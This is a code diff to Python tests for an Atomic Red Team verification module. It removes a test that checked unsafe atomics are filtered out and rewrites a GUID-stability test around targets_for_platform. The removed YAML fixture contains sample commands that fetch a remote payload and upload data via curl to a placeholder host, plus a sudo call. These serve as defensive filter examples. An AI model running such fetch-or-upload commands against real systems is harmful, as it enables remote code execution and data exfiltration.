@@ -3,7 +3,6 @@ from pathlib import Path
 from atomic_red_team.verification import (
     build_platform_matrix,
     merge_verification_results,
-    seed_allowed_atomics,
     shard_for_guid,
     targets_for_platform,
 )
@@ -14,104 +13,7 @@ def write_atomic(path: Path, body: str) -> None:
     path.write_text(body, encoding="utf-8")
 
 
-def test_seed_allowed_atomics_excludes_unsafe_tests(tmp_path):
-    write_atomic(
-        tmp_path / "T1000" / "T1000.yaml",
-        """
-attack_technique: T1000
-display_name: Safe Examples
-atomic_tests:
-- name: safe command
-  auto_generated_guid: 11111111-1111-4111-8111-111111111111
-  description: Runs locally and cleans up.
-  supported_platforms:
-  - linux
-  executor:
-    name: sh
-    command: echo safe > /tmp/art-safe
-    cleanup_command: rm /tmp/art-safe
-- name: manual test
-  auto_generated_guid: 22222222-2222-4222-8222-222222222222
-  description: Requires a person.
-  supported_platforms:
-  - linux
-  executor:
-    name: manual
-    steps: Do this by hand.
-- name: elevated test
-  auto_generated_guid: 33333333-3333-4333-8333-333333333333
-  description: Requires elevation.
-  supported_platforms:
-  - linux
-  executor:
-    name: sh
-    elevation_required: true
-    command: sudo id
-    cleanup_command: echo done
-- name: url test
-  auto_generated_guid: 44444444-4444-4444-8444-444444444444
-  description: Downloads remote code.
-  supported_platforms:
-  - linux
-  executor:
-    name: sh
-    command: curl https://example.test/payload.sh
-    cleanup_command: echo done
-- name: url argument test
-  auto_generated_guid: 88888888-8888-4888-8888-888888888888
-  description: Uses a URL through an input argument.
-  supported_platforms:
-  - linux
-  input_arguments:
-    destination:
-      description: Remote destination.
-      type: url
-      default: https://example.test/upload
-  executor:
-    name: sh
-    command: curl #{destination}
-    cleanup_command: echo done
-- name: missing cleanup
-  auto_generated_guid: 55555555-5555-4555-8555-555555555555
-  description: Leaves state behind.
-  supported_platforms:
-  - linux
-  executor:
-    name: sh
-    command: touch /tmp/art-leftover
-- name: cloud test
-  auto_generated_guid: 66666666-6666-4666-8666-666666666666
-  description: Requires a cloud tenant.
-  supported_platforms:
-  - iaas:aws
-  executor:
-    name: sh
-    command: echo aws
-    cleanup_command: echo done
-- name: likely interactive
-  auto_generated_guid: 77777777-7777-4777-8777-777777777777
-  description: Opens a UI.
-  supported_platforms:
-  - macos
-  executor:
-    name: sh
-    command: osascript -e 'display dialog "hi"'
-    cleanup_command: echo done
-""",
-    )
-
-    allowed = seed_allowed_atomics(tmp_path)
-
-    assert allowed["atomics"] == [
-        {
-            "guid": "11111111-1111-4111-8111-111111111111",
-            "technique": "T1000",
-            "platforms": ["linux"],
-        }
-    ]
-
-
-def test_seed_allowed_atomics_uses_guid_as_stable_key_when_order_changes(tmp_path):
+def test_targets_for_platform_uses_guid_as_stable_key_when_order_changes(tmp_path):
     write_atomic(
         tmp_path / "T1001" / "T1001.yaml",
         """
@@ -138,7 +40,22 @@ atomic_tests:
     cleanup_command: echo clean
 """,
     )
-    first = seed_allowed_atomics(tmp_path)
+    allowed = {
+        "version": 1,
+        "atomics": [
+            {
+                "guid": "aaaaaaaa-aaaa-4aaa-8aaa-aaaaaaaaaaaa",
+                "technique": "T1001",
+                "platforms": ["linux"],
+            },
+            {
+                "guid": "bbbbbbbb-bbbb-4bbb-8bbb-bbbbbbbbbbbb",
+                "technique": "T1001",
+                "platforms": ["linux"],
+            },
+        ],
+    }
+    first_targets = targets_for_platform(allowed, "linux", tmp_path)
 
     write_atomic(
         tmp_path / "T1001" / "T1001.yaml",
@@ -166,11 +83,11 @@ atomic_tests:
     cleanup_command: echo clean
 """,
     )
-    second = seed_allowed_atomics(tmp_path)
-    second_targets = targets_for_platform(second, "linux", tmp_path)
+    second_targets = targets_for_platform(allowed, "linux", tmp_path)
 
-    assert {item["guid"] for item in first["atomics"]} == {
-        item["guid"] for item in second["atomics"]
+    assert {item["guid"] for item in first_targets["atomics"]} == {
+        "aaaaaaaa-aaaa-4aaa-8aaa-aaaaaaaaaaaa",
+        "bbbbbbbb-bbbb-4bbb-8bbb-bbbbbbbbbbbb",
     }
     assert {item["guid"] for item in second_targets["atomics"]} == {
         "bbbbbbbb-bbbb-4bbb-8bbb-bbbbbbbbbbbb",
